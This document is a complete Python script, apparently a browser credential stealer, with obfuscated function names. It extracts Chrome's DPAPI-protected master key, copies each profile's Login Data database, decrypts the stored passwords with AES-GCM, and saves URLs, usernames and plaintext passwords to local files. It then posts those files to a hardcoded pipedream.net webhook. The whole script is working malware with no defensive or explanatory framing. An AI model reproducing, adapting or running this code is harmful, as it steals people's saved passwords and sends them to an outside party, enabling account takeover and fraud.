import os as o
import re as r
import sys as s
import json as j
import base64 as b
import sqlite3 as q
import win32crypt as w
from Crypto.Cipher import AES
import shutil as h
import csv as c
import requests as req

# GLOBAL CONSTANTS
C1 = o.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State" % (o.environ['USERPROFILE']))
C2 = o.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data" % (o.environ['USERPROFILE']))

# Function to get secret key from Chrome's Local State
def k1():
    try:
        with open(C1, "r", encoding='utf-8') as f:
            l = j.loads(f.read())
        s_k = b.b64decode(l["os_crypt"]["encrypted_key"])[5:]
        s_k = w.CryptUnprotectData(s_k, None, None, None, 0)[1]
        return s_k
    except Exception as e:
        print(f"[ERR] Chrome secret key not found: {e}")
        return None

# Function to generate AES cipher
def k3(a_k, iv):
    return AES.new(a_k, AES.MODE_GCM, iv)

# Function to decrypt the password
def k4(c_t, s_k):
    try:
        iv = c_t[3:15]
        e_p = c_t[15:-16]
        tag = c_t[-16:]  # Extract authentication tag
        cy = k3(s_k, iv)
        d_p = cy.decrypt_and_verify(e_p, tag).decode()
        return d_p
    except Exception as e:
        print(f"[ERR] Decryption failed: {e}")
        return ""

# Function to get a connection to the Chrome database
def k5(chrome_db):
    try:
        h.copy2(chrome_db, "Loginvault.db")
        return q.connect("Loginvault.db")
    except Exception as e:
        print(f"[ERR] Chrome database not found: {e}")
        return None

# Function to save output to a text file
def k6(output, file_name='decrypted_passwords.txt'):
    try:
        with open(file_name, 'w', encoding='utf-8') as f:
            f.write(output)
        print(f"[INFO] Output saved to {file_name}")
    except Exception as e:
        print(f"[ERR] Unable to save file: {e}")

# Function to send the content of the txt file to the webhook
def k7(f_n, w_u):
    try:
        with open(f_n, 'r', encoding='utf-8') as f:
            data = f.read()
        print(f"[DEBUG] Sending Data: {data[:500]}")  # Print first 500 characters for debugging
        response = req.post(w_u, data={'file_content': data})
        if response.status_code == 200:
            print(f"[INFO] Successfully sent data to the webhook.")
        else:
            print(f"[ERR] Webhook failed. Status Code: {response.status_code}")
    except Exception as e:
        print(f"[ERR] Error sending file to webhook: {e}")

if __name__ == '__main__':
    try:
        output_data = ""
        s_k = k1()
        f = [el for el in o.listdir(C2) if r.search("^Profile*|^Default$", el) is not None]

        with open('decrypted_password.csv', mode='w', newline='', encoding='utf-8') as df:
            cw = c.writer(df, delimiter=',')
            cw.writerow(["index", "url", "username", "password"])

            for folder in f:
                c_db = o.path.normpath(f"{C2}\{folder}\Login Data")
                conn = k5(c_db)
                if s_k and conn:
                    cursor = conn.cursor()
                    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                    for index, login in enumerate(cursor.fetchall()):
                        url, username, ciphertext = login
                        if url and username and ciphertext:
                            d_p = k4(ciphertext, s_k)
                            print(f"URL: {url}\nUsername: {username}\nPassword: {d_p}\n{'-'*50}")  # Debugging
                            output_data += f"Sequence: {index}\nURL: {url}\nUsername: {username}\nPassword: {d_p}\n{'*'*50}\n"
                            cw.writerow([index, url, username, d_p])
                    cursor.close()
                    conn.close()
                    o.remove("Loginvault.db")
        
        k6(output_data)
        k7('decrypted_passwords.txt', 'https://eojoofu0u14ynwn.m.pipedream.net')
    except Exception as e:
        print(f"[ERR] {e}")
